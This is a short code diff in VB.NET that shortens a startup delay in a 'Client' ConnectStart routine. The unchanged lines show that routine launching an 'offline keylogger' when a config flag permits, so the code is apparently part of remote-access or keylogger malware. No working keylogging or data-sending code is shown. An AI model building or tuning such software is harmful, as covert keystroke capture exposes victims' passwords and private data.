@@ -47,7 +47,7 @@ Namespace Client
 
 
 		Public Sub ConnectStart()
-			Thread.Sleep(250)
+			Thread.Sleep(125)
 			If Not StarterClass.KeylogOn And Config.offKeylog <> "False" Then
 				StarterClass.StartOfflineKeylogger()
 			End If
